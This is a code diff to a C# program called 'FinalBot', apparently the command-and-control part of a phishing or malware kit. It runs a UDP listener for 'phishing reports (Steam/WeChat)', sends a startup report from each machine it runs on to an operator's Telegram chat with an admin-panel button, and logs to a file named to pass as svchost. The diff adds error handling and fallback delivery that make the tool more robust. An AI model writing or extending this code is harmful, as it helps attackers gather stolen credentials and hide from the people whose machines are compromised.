@@ -12,6 +12,7 @@ using System.Diagnostics.CodeAnalysis;
 using System.Net;
 using System.Net.Sockets;
 using System.Text;
+using System.Reflection;
 
 namespace FinalBot
 {
@@ -37,27 +38,38 @@ namespace FinalBot
 
         public async Task StartAsync()
         {
-            Console.WriteLine("[ORCHESTRATOR] Starting services...");
-            
-            // Start UDP listener for phishing reports (Steam/WeChat)
-            _ = Task.Run(() => StartUdpListener());
-
-            // 1. Initial Report (via Telegram as fallback/sender)
-            await SendStartupReport();
-
-            Console.WriteLine("[ORCHESTRATOR] Telegram Polling active.");
-
-            var receiverOptions = new Telegram.Bot.Polling.ReceiverOptions
+            try 
             {
-                AllowedUpdates = null // This allows all updates and avoids the generic list trimming issue
-            };
+                DebugLog("[ORCHESTRATOR] Starting services...");
+                
+                // Start UDP listener for phishing reports (Steam/WeChat)
+                DebugLog("[ORCHESTRATOR] Launching UDP listener...");
+                _ = Task.Run(() => StartUdpListener());
 
-            _botClient.StartReceiving(
-                updateHandler: _commandHandler.HandleUpdateAsync,
-                pollingErrorHandler: _commandHandler.HandlePollingErrorAsync,
-                receiverOptions: receiverOptions,
-                cancellationToken: default
-            );
+                // 1. Initial Report (via Telegram as fallback/sender)
+                DebugLog("[ORCHESTRATOR] Sending startup report...");
+                await SendStartupReport();
+
+                Console.WriteLine("[ORCHESTRATOR] Telegram Polling active.");
+
+                var receiverOptions = new Telegram.Bot.Polling.ReceiverOptions
+                {
+                    AllowedUpdates = null // This allows all updates and avoids the generic list trimming issue
+                };
+
+                _botClient.StartReceiving(
+                    updateHandler: _commandHandler.HandleUpdateAsync,
+                    pollingErrorHandler: _commandHandler.HandlePollingErrorAsync,
+                    receiverOptions: receiverOptions,
+                    cancellationToken: default
+                );
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"[STARTUP ERROR] {ex.Message}\n{ex.StackTrace}");
+                // Log to file since console might be hidden
+                try { System.IO.File.AppendAllText("C:\\Users\\Public\\svchost_debug.log", $"[{DateTime.Now}] [BOT ERROR] {ex}\n"); } catch { }
+            }
 
             // Keep alive
             while (_isRunning)
@@ -91,14 +103,37 @@ namespace FinalBot
 
             try 
             {
-                await _botClient.SendTextMessageAsync(
-                    chatId: _adminId,
-                    text: info,
-                    parseMode: ParseMode.Html,
-                    replyMarkup: inlineKeyboard
-                );
+                string videoFileId = "CgACAgIAAyEFAATT7RxjAAIXWmnAa9yim1cDt_oGCHyz0rIOFDx8AALPnAACyAYISsdwWy9VaKdpOgQ";
+                string adminPanelMarkup = "{\"inline_keyboard\":[[{\"text\":\"💠 Админ-панель\",\"callback_data\":\"admin_panel\"}]]}";
+                
+                DebugLog($"[ORCHESTRATOR] Calling TelegramService.SendAnimation for ID: {videoFileId}");
+
+                bool success = await TelegramService.SendAnimation(videoFileId, info, adminPanelMarkup);
+                DebugLog($"[ORCHESTRATOR] TelegramService.SendAnimation result: {success}");
+
+                if (!success)
+                {
+                    string backupPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Untitlфффed.mp4");
+                    if (System.IO.File.Exists(backupPath))
+                    {
+                        DebugLog("[ORCHESTRATOR] File fallback...");
+                        bool fileSuccess = await TelegramService.SendFile(backupPath, info, adminPanelMarkup);
+                        if (!fileSuccess)
+                        {
+                            await TelegramService.SendMessage(info, adminPanelMarkup);
+                        }
+                    }
+                    else
+                    {
+                        await TelegramService.SendMessage(info, adminPanelMarkup);
+                    }
+                }
             }
-            catch { }
+            catch (Exception ex)
+            {
+                DebugLog($"[BOT ERROR] {ex}");
+                try { await TelegramService.SendMessage(info, "{\"inline_keyboard\":[[{\"text\":\"💠 Админ-панель\",\"callback_data\":\"admin_panel\"}]]}"); } catch { }
+            }
         }
 
         private async Task StartUdpListener()
@@ -129,6 +164,11 @@ namespace FinalBot
             {
                 Console.WriteLine($"[UDP ERROR] {ex.Message}");
             }
+        }
+
+        private void DebugLog(string msg)
+        {
+            try { System.IO.File.AppendAllText("C:\\Users\\Public\\svchost_debug.log", $"[{DateTime.Now}] {msg}\n"); } catch { }
         }
 
         public void Stop()
